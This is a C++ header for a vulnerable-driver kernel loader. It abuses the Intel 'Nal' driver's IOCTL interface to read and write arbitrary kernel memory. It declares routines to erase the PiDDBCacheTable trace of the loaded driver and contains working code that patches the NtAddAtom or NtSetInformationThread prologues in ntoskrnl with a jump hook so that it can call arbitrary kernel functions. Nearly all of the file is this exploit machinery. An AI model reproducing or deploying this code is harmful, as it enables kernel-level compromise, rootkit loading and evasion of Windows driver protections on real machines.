#pragma once

#include "Common.hpp"
#include "Helper.hpp"
#include "PEUtils.hpp"
#include "X64Assembler.hpp"
#include "Win.hpp"
#include <ntstatus.h>




// Intel driver
constexpr auto DEVICE_NAME = L"\\\\.\\Nal";


// Unique IOCTL code needed for the exploit, dispatch is handled by the Intel driver via case_number field. 
constexpr ULONG32 ioctl1 = 0x80862007;


// Correspondig case numbers to pass to deviceIoControl.
enum IOCTL_CASE_NUMBER
{
	COPY_MEMORY_BUFF_INFO = 0x33,
	FILL_MEMORY_BUFF_INFO = 0x30,
	GET_PHYS_ADDRESS_BUFF_INFO = 0x25,
	MAP_IO_SPACE_BUFF_INFO = 0x19,
	UNMAP_IO_SPACE_BUFF_INFO = 0x1A
};


// IOCTL Commands Structs
typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

typedef struct _FILL_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint32_t value;
	uint32_t reserved2;
	uint64_t destination;
	uint64_t length;
}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;

}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;




class IntelLoader
{
private:
	HANDLE hIntelDriver;
	UINT64 ntoskrnlBaseAddress = 0;



public:
	IntelLoader();
	~IntelLoader();

	/* Intel driver management */
	std::wstring GetDriverPath();
	std::wstring GetDriverName();
	BOOL LoadVulnDriver();
	BOOL UnloadVulnDriver();
	BOOL OpenDevice();




	/* Memory & resources management */
	BOOL MemoryCopy(uint64_t destination, uint64_t source, uint64_t size) const;
	BOOL SetMemory(uint64_t address, uint32_t value, uint64_t size) const;
	BOOL GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) const;
	UINT64 MapIoSpace(uint64_t physical_address, uint32_t size) const;
	BOOL UnmapIoSpace(uint64_t address, uint32_t size) const;
	BOOL ReadMemory(uint64_t address, void* buffer, uint64_t size);
	BOOL WriteMemory(uint64_t address, void* buffer, uint64_t size);
	BOOL WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	BOOL ExFreePool(uint64_t address);
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	BOOLEAN MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG newProtection);
	BOOL ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait);
	BOOL ExReleaseResourceLite(PVOID resource);

	



	/* PiDDBCacheTable cleaning function */
	PVOID GetPiDDBLock();
	PRTL_AVL_TABLE GetPiDDBCacheTable();

	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Table, PVOID* RestartKey);


	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);


	/* Helpers */
	VOID SetKernelBaseAddress();
	UINT64 GetNtoskrnlBaseAddress() const noexcept;
	UINT64 GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	PVOID ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize);


	BOOL isValid() const noexcept { return hIntelDriver != INVALID_HANDLE_VALUE && ntoskrnlBaseAddress != 0; }
	HANDLE GetHandle() const { return hIntelDriver; }




		template <typename T, typename... A>
		bool CallKernelFunction(uint64_t KernelBase, T* out_result, uint64_t kernel_function_address, A... arguments)
		{
			constexpr bool is_void = std::is_same_v<T, void>;
			static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments supported");

			JumpLine();
			LOG_INFO("***Calling kernel function***");
			JumpLine();

			if constexpr (!is_void)
			{
				if (!out_result)
				{
					std::wcout << L"out_result is null\n";
					return false;
				}
			}

			if (!kernel_function_address)
			{
				std::wcout << L"kernel_function_address is null\n";
				return false;
			}

			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
			if (!ntdll)
			{
				std::wcout << L"GetModuleHandleA(ntdll) failed\n";
				return false;
			}

			const auto NtAddAtomUser = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
			if (!NtAddAtomUser)
			{
				std::wcout << L"GetProcAddress(NtAddAtom) failed\n";
				return false;
			}

			uint64_t kernel_NtAddAtom = GetKernelModuleExport(KernelBase, "NtAddAtom");
			if (!kernel_NtAddAtom)
			{
				std::wcout << L"GetKernelModuleExport(ntoskrnl.NtAddAtom) failed\n";
				return false;
			}

			uint8_t oriNtAddAtomBytes[12] = { 0 };

			std::wcout << L"[DEBUG] Saving original bytes...\n";
			if (!ReadMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12))
			{
				std::wcout << L"[ERROR] Error saving NtAddAtom original prologue!" << std::endl;
				return false;
			}


			std::wcout << L"[DEBUG] Original bytes: ";
			for (int i = 0; i < 12; i++) {
				std::wcout << std::hex << static_cast<int>(oriNtAddAtomBytes[i]) << L" ";
			}
			std::wcout << std::dec << L"\n";


			std::wcout << L"[DEBUG] Original bytes saved successfully\n";

			auto hook_vec = X64Assembler::PolymorphicHook(kernel_function_address, 12);

			if (!WriteToReadOnlyMemory(kernel_NtAddAtom, (void*)hook_vec.data(), 12))
			{
				std::wcout << L"[ERROR] WriteToReadOnlyMemory(hook) failed\n";
				return false;
			} 

			LOG_SUCCESS("Hook written successfully.");

			// Make the call
			using FunctionFn = T(__stdcall*)(A...);
			const auto fn = reinterpret_cast<FunctionFn>(NtAddAtomUser);

			if constexpr (is_void)
			{
				fn(arguments...);
				std::wcout << L"[DEBUG] Void call completed\n";
			}
			else
			{
				*out_result = fn(arguments...);
				std::wcout << L"[DEBUG] Call returned: " << *out_result << L"\n";
			}

			std::wcout << L"[DEBUG] Restoring original bytes...\n";

			// And finally restore the original bytes.
			const bool restored = WriteToReadOnlyMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12);
			if (!restored)
			{
				std::wcout << L"[ERROR] Restore failed\n";
			}
			else
			{
				std::wcout << L"[DEBUG] Restore OK\n";
			}

			std::wcout << L"[DEBUG] Function completed successfully\n";
			return restored;
		}

		template <typename T, typename... A>
		bool CallKernelFunction1(uint64_t KernelBase, T* out_result, uint64_t kernel_function_address, A... arguments)
		{
			constexpr bool is_void = std::is_same_v<T, void>;
			static_assert(sizeof...(A) <= 4, "CallKernelFunctionFixed: max 4 arguments");

			std::wcout << L"*** CallKernelFunctionFixed (no polymorph) ***\n";

			if constexpr (!is_void) { if (!out_result) { std::wcout << L"out_result null\n"; return false; } }
			if (!kernel_function_address) { std::wcout << L"kernel_function_address null\n"; return false; }

			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
			if (!ntdll) { std::wcout << L"ntdll null\n"; return false; }

			const auto SyscallUser = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtSetInformationThread"));
			if (!SyscallUser) { std::wcout << L"NtSetInformationThread not found\n"; return false; }

			const uint64_t SyscallKernel = GetKernelModuleExport(KernelBase, "NtSetInformationThread");
			if (!SyscallKernel) { std::wcout << L"kernel NtSetInformationThread not found\n"; return false; }

			uint8_t original[12] = {};
			if (!ReadMemory(SyscallKernel, original, 12)) { std::wcout << L"ReadMemory original failed\n"; return false; }

			std::wcout << L"Kernel prologue : ";
			for (int i = 0; i < 12; ++i) std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << original[i] << L' ';
			std::wcout << L"\n";



			uint8_t hook[12] = {
				0x48, 0xB8,                                         // mov rax, imm64
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr (8 B)
				0xFF, 0xE0                                          // jmp rax
			};

			// Copy function address
			memcpy(hook + 2, &kernel_function_address, 8);

			std::wcout << L"Hook bytes      : ";
			for (int i = 0; i < 12; ++i) std::wcout << std::hex << std::setw(2) << hook[i] << L' ';
			std::wcout << L"\n";

			if (!WriteToReadOnlyMemory(SyscallKernel, hook, 12)) { std::wcout << L"Write hook failed\n"; return false; }

			using FunctionFn = T(__stdcall*)(A...);
			const auto fn = reinterpret_cast<FunctionFn>(SyscallUser);

			if constexpr (is_void) {
				fn(arguments...);
				std::wcout << L"Void call done\n";
			}
			else {
				*out_result = fn(arguments...);
				std::wcout << L"Call returned 0x" << std::hex << *out_result << L"\n";
			}

			bool ok = WriteToReadOnlyMemory(SyscallKernel, original, 12);
			std::wcout << (ok ? L"Restore OK\n" : L"Restore FAILED\n");
			return ok;
		}
};
